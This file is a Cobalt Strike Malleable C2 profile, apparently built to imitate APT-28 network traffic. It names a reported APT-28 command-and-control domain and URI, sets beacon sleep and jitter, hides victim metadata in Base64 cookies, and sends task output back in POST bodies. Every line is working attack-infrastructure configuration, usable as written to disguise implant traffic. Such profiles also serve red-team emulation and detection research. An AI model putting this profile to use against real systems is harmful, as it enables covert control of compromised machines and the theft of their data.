set sleeptime "30000";
set jitter    "5";
set maxdns    "255";
set useragent "Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0";

http-get {
    #Used Trend Micro Report for APT-28 URI 
    set uri "/url/544036/cormac.mcr";

    client {

        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8";
        header "Connection" "Close";

        # Well-Known APT-28 C2 domain
        header "Host" "adawareblock.com";
        header "Cache-Control" "no-cache";
        
        metadata {
            base64;
            header "Cookie";
        }
    }

    server {
        header "Server" "Apache/2.2.26 (Unix)";
        header "X-Powered-By" "PHP/5.3.28";
        header "Connection" "close";

        output {
            print;
        }
    }
}

http-post {

    set uri "/k9/eR3/a/UE/eR.pdf/bKC=xCCmnuXFZ6Chw2ah1oM=";

    client {

        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8";
        header "Connection" "Keep-Alive";

        # Well Known APT-28 domain
        header "Host" "adawareblock.com";
        header "Cache-Control" "no-cache";

        id {
            netbios;
            parameter "id";
        }

        output {
            base64;
            prepend "DATA=";
            print;
        }
    }

    server {
        header "Server" "Apache/2.2.26 (Unix)";
        header "X-Powered-By" "PHP/5.3.28";
        header "Content-Type" "text/html";
        header "Content-Length" "58";
        header "Connection" "close";
        

        output {
            base64;
            print;
        }
    
    }
}
